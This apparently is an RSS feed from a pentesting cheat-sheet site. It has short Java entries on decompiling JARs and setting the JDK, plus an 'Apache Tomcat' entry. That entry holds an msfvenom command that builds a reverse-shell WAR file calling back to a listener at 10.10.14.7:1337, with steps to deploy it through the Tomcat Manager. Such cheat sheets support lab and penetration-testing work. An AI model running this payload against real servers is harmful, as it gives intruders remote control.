channel.title: Java on TLDRBins
channel.description: Recent content in Java on TLDRBins

item.title: Apache Tomcat
item.description: RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -> Deploy | |3. Click /revshell in Applications table | +------------------------------------------+

item.title: Java
item.description: Java Decompile JAR Download jd-gui jd-gui

item.title: Java Environment
item.description: Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac
